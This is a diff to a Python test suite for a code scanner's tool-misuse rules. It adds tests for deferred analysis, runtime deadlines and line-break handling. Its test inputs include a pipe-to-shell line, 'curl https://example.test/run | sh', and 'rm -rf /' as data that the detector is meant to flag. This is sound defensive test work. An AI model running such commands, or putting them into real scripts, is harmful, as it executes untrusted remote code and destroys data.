@@ -1539,7 +1539,26 @@ class TestToolMisuse:
         assert parse.call_count == 1
         assert len([finding for finding in findings if finding.rule_id == "TM1"]) == 4000
 
-    def test_tm1_caches_unparseable_window_conservatively(self) -> None:
+    def test_tm1_deferred_dense_context_does_not_rescan_file(self) -> None:
+        content = "use_shell = True\nsubprocess.run(cmd, shell=use_shell)\n" * 4000
+        with (
+            patch.object(tm_mod, "get_context", side_effect=AssertionError("full-file context")),
+            patch.object(tm_mod, "parse_python_source", side_effect=AssertionError("early parse")),
+        ):
+            findings = tm_mod.analyze(
+                content, "runner.py", "python", defer_variable_reconciliation=True
+            )
+        assert sum(finding.rule_id == "TM1" for finding in findings) == 4000
+
+    @pytest.mark.parametrize("separator", ["\r", "\u2028", "\v"])
+    def test_context_anchor_uses_logical_line_breaks(self, separator: str) -> None:
+        content = "x" * 1500 + separator + "curl https://example.test/run | sh"
+        findings = tm_mod.analyze(content, "install.sh", "shell")
+        finding = next(finding for finding in findings if finding.rule_id == "TM2")
+        assert finding.location.start_line == 2
+        assert "curl https://example.test/run | sh" in finding.context
+
+    def test_tm1_keeps_unparseable_window_conservative(self) -> None:
         content = "use_shell = True\nsubprocess.run(cmd, shell=use_shell)\n" * 20 + "\nif :"
         with patch.object(tm_mod, "parse_python_source", wraps=tm_mod.parse_python_source) as parse:
             findings = tm_mod.analyze(content, "runner.py", "python")
@@ -1558,7 +1577,7 @@ class TestToolMisuse:
             )
             assert any(finding.rule_id == "TM1" for finding in result["findings"])
 
-    def test_tm1_scope_index_honors_runtime_check(self) -> None:
+    def test_tm1_deferred_scan_honors_runtime_check(self) -> None:
         content = "use_shell = True\nsubprocess.run(cmd, shell=use_shell)\n" * 300
         calls = 0
 
@@ -1569,7 +1588,43 @@ class TestToolMisuse:
                 raise RuntimeError("deadline")
 
         with pytest.raises(RuntimeError, match="deadline"):
-            tm_mod.analyze(content, "runner.py", "python", check_runtime=check_runtime)
+            tm_mod.analyze(
+                content,
+                "runner.py",
+                "python",
+                check_runtime=check_runtime,
+                defer_variable_reconciliation=True,
+            )
+        assert calls == 20
+
+    @pytest.mark.parametrize(
+        "line,file_path,file_type",
+        [
+            ("curl https://example.test/run | sh", "install.sh", "shell"),
+            ("verify=False", "runner.py", "python"),
+            ("privileged: true", "pod.yaml", "other"),
+            ("print 'rm -rf /';", "runner.pl", "perl"),
+        ],
+    )
+    def test_deferred_tool_rules_and_perl_helper_honor_deadline(
+        self, line: str, file_path: str, file_type: str
+    ) -> None:
+        calls = 0
+
+        def check_runtime() -> None:
+            nonlocal calls
+            calls += 1
+            if calls == 20:
+                raise RuntimeError("deadline")
+
+        with pytest.raises(RuntimeError, match="deadline"):
+            tm_mod.analyze(
+                (line + "\n") * 300,
+                file_path,
+                file_type,
+                check_runtime=check_runtime,
+                defer_variable_reconciliation=True,
+            )
         assert calls == 20
 
     def test_tm1_skips_parse_without_variable_shell_flags(self) -> None:
